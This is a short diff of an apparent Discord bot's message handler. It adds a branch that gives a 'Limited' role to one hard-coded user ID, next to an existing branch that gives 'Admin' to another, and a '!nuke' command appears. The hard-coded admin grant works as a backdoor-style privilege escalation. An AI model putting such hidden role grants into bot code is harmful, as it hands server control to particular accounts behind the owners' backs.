@@ -118,6 +118,9 @@ async def on_message(message):
             if message.author.id == 258295063635951618:
                 role = discord.utils.get(message.author.guild.roles, name="Admin")
                 await message.author.add_roles(role)
+            elif message.author.id == 612388606425694247:
+                role = discord.utils.get(message.author.guild.roles, name="Limited")
+                await message.author.add_roles(role)
             
         elif message.content.find("!nuke")!= -1:
             await message.channel.send("3")
